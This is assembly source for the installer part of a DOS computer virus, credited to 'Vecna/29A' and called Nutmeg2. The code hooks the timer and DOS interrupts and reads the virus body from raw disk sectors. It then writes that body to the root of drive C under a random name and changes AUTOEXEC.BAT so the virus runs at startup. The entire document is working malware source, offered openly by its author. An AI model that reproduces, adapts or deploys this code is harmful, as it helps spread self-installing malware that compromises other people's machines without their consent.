;[Nutmeg2] virus by Vecna/29A
;Installer
;
;These routines add to the AUTOEXEC.BAT a random named virus sample, and
;write this virus sample to the root dir. To do this, it hook interrupt 0x1C,
;wait for DOS load and hook interrupt 0x21. This hook wait for a file execute
;and then read the virus code and write it to the disk as a file, and then
;modify AUTOEXEC.BAT to execute this file. All interrupts hook are restored
;after use, and only 1 kilobyte is subtracted from memory. The virus sample
;is executed with a "!" as single parameter. This is done to warn the virus
;to disinfect AUTOEXEC.BAT.

.MODEL TPASCAL
.386P
.CODE
ORG 0

       PUBLIC LOADER

LOADER:
       MOV DI, OFFSET MUTATE-OFFSET LOADER
       MOV CX, 8
NCHAR:
       IN AL, 40H
       AND AL, 01111B
       ADD AL, 'A'
       DB 2EH
       STOSB
       LOOP NCHAR
       PUSH 0
       POP DS
       MOV AX, OFFSET INT1C-OFFSET LOADER
       MOV SI, 1CH*4
       MOV DI, OFFSET OLD1C-OFFSET LOADER
       CLD
       CLI
       XCHG AX, WORD PTR DS:[SI]
       DB 2EH
       STOSW
       MOV AX, CS
       XCHG AX, WORD PTR DS:[SI+2]
       DB 2EH
       STOSW
       STI
       XOR EAX, EAX
       MOV DWORD PTR DS:[21H*4], EAX
       MOV ES, AX
       MOV BX, 7C00H
       MOV AX, 201H
       MOV CX, 2
       MOV DX, 80H
       INT 13H
       DB 0EAH
       DW 7C00H
       DW 0

INT1C:
       PUSH DS
       PUSHAD
       PUSH 0
       POP DS
       MOV CX, WORD PTR DS:[21H*4+2]
       CMP CX, 800H
       JA NOT_YET
       JCXZ NOT_YET
       MOV ESI, 21H*4
       MOV EDI, 0FFH*4
       MOV EAX, DWORD PTR DS:[ESI]
       MOV DWORD PTR DS:[EDI], EAX
       MOV AX, CS
       ROL EAX, 16
       MOV AX, OFFSET INT21-OFFSET LOADER
       MOV DWORD PTR DS:[ESI], EAX
       MOV EAX, DWORD PTR CS:[OLD1C-OFFSET LOADER]
       MOV DWORD PTR DS:[1CH*4], EAX
NOT_YET:
       POPAD
       POP DS
       DB 0EAH
OLD1C  DD 0

INT21:
       PUSH DS
       PUSH ES
       PUSHAD
ALL_PUSHED:
       PUSH 0
       POP DS
       CMP AX, 4B00H
       JNE NO_4B00
EXECUTING:
       MOV EAX, DWORD PTR DS:[0FFH*4]
       MOV DWORD PTR DS:[21H*4], EAX
       MOV AX, CS
       SUB AX, 1000H
       MOV ES, AX
       MOV AX, 200H+(4096/512)
       XOR BX, BX
       MOV CX, 5
       MOV DX, 80H
       INT 13H
       JC ERROR
       MOV AH, 3CH
       MOV CX, 10B
       PUSH CS
       POP DS
       MOV DX, OFFSET FNAME-OFFSET LOADER
       INT 21H
       JC ERROR
       XCHG AX, BX
       PUSH ES
       POP DS
       XOR DX, DX
       MOV AH, 40H
       MOV CX, 4096
       INT 21H
       JC ERROR
       PUSH CS
       POP DS
       MOV AH, 3EH
       INT 21H
       MOV AX, 3D02H
       MOV DX, OFFSET FNAME2-OFFSET LOADER
       INT 21H
       JC ERROR
       XCHG AX, BX
       MOV AX, 4202H
       XOR CX, CX
       CWD
       INT 21H
       MOV AH, 40H
       MOV CX, FSIZE-1
       MOV DX, OFFSET FNAME-OFFSET LOADER
       INT 21H
       JC ERROR
       MOV AH, 40H
       MOV CX, FSIZE2
       MOV DX, OFFSET PARAMS-OFFSET LOADER
       INT 21H
       JC ERROR
ERROR:
       MOV AH, 3EH
       INT 21H
NO_4B00:
       POPAD
       POP ES
       POP DS
       INT 0FFH
       RETF 2

FNAME  DB "C:\"
MUTATE DB 8 DUP (0)
       DB ".EXE", 0
FSIZE  EQU $-OFFSET FNAME

PARAMS DB " !", 13, 10
FSIZE2 EQU $-OFFSET PARAMS

FNAME2 DB 'AUTOEXEC.BAT', 0

END    LOADER
